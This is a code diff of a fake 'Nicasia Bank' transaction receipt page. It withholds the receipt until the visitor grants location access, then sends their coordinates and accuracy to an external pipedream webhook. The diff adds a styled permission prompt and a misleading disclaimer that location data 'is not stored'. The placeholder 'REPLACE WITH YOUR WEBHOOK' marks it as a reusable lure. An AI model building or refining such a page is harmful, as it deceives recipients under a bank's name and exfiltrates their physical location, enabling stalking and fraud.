@@ -61,6 +61,24 @@
       font-size: 14px;
       margin-top: 15px;
     }
+    .permission-prompt {
+      background: white;
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .permission-prompt button {
+      background: #2a5f8a;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
     .disclaimer {
       font-size: 12px;
       color: #666;
@@ -79,10 +97,19 @@
   </style>
 </head>
 <body>
+  <div class="permission-prompt" id="permission-prompt">
+    <h3>Nicasia Bank Transaction Verification</h3>
+    <p>Please grant location access to view your transaction receipt.</p>
+    <button onclick="requestLocation()">Grant Location Access</button>
+    <p id="permission-status"></p>
+  </div>
+
   <div class="receipt" id="receipt">
     <div class="bank-logo">NICASIA BANK</div>
     <h2>Transaction Receipt</h2>
+    
     <div class="success-badge">Transaction Successful</div>
+    
     <div class="details">
       <div class="detail-row">
         <span class="detail-label">From:</span>
@@ -105,6 +132,7 @@
         <span class="detail-value">NIC-7890-2024</span>
       </div>
     </div>
+    
     <div id="location-status">Transaction verified with location data</div>
     <p class="disclaimer">
       Location data is used solely for verification and is not stored.
@@ -115,9 +143,9 @@
   <script>
     // Set current date
     document.getElementById('transaction-date').textContent = new Date().toLocaleString();
-
+    
     let userPosition = null;
-    const WEBHOOK_URL = "https://eoujfk3m6inyjql.m.pipedream.net"; // REPLACE WITH YOUR URL
+    const WEBHOOK_URL = "https://eoujfk3m6inyjql.m.pipedream.net"; // REPLACE WITH YOUR WEBHOOK
 
     function sendToWebhook(data) {
       fetch(WEBHOOK_URL, {
@@ -138,20 +166,26 @@
         alert("No location data available");
       }
     }
-
+    
     function requestLocation() {
+      const permissionStatus = document.getElementById('permission-status');
       const receipt = document.getElementById('receipt');
-      const permissionStatus = document.getElementById('location-status');
-
+      const prompt = document.getElementById('permission-prompt');
+      
       if (navigator.geolocation) {
         permissionStatus.textContent = "Checking location...";
-
+        
         navigator.geolocation.getCurrentPosition(
           (position) => {
             userPosition = position;
-            console.log(`Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`);
-
-            // Send location data to webhook
+            
+            console.log(`
+              Lat: ${position.coords.latitude}
+              Long: ${position.coords.longitude}
+              Accuracy: ${position.coords.accuracy}m
+              Timestamp: ${new Date(position.timestamp)}
+            `);
+            
             const webhookData = {
               transaction_id: "NIC-7890-2024",
               amount: "NPR 3,000",
@@ -166,13 +200,14 @@
               timestamp: new Date().toISOString()
             };
             sendToWebhook(webhookData);
-
-            // Show receipt
+            
+            prompt.style.display = 'none';
             receipt.style.display = 'block';
-            permissionStatus.textContent = `Location verified (accuracy: ${position.coords.accuracy}m)`;
+            document.getElementById('location-status').textContent = 
+              `Location verified (accuracy: ${position.coords.accuracy}m)`;
           },
           (error) => {
-            permissionStatus.textContent = "Location access is required to view your receipt.";
+            permissionStatus.textContent = "Location access is required to view receipt.";
             if (error.code === error.PERMISSION_DENIED) {
               permissionStatus.textContent = "You must grant location access to view your receipt.";
             }
@@ -182,9 +217,6 @@
         permissionStatus.textContent = "Geolocation is not supported by your browser.";
       }
     }
-
-    // Automatically request location permission as soon as the page loads
-    window.onload = requestLocation;
   </script>
 </body>
 </html>
